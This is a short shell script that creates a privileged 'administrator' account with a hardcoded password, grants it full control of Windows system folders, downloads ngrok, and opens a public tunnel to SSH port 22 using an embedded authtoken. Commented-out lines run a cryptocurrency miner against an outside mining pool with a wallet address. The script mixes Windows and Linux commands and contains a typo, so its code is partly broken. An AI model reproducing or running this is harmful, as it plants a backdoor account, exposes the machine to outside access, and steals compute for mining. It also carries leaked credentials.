#!/bin/bash
net user administrator Lovebattan@9 /add >nulb
net localgroup administrators administrator /add >nul
net user administrator /active:yes >nul
diskperf -Y >nul
sc config Audiosrv start= auto >nul
sc start audiosrv >nul
ICACLS C:\Windows\Temp /grant administrator:F >nul
ICACLS C:\Windows\installer /grant administrator:F >nul
wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip

unzip -qq -n ngrok-stable-linux-amd64.zip

./ngrok authtoken  1eJ879JFo0Lde3KB9Z3E7R0q8vN_7CF88NU5Q1epjY9k5Nomr
./ngrok tcp 22  

 done 

#chmod +x cpuminer

#./cpuminer -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u MhXVoEN4V4syfXUZf4onpEpZRXiuZ2Qy5t.test1


#done
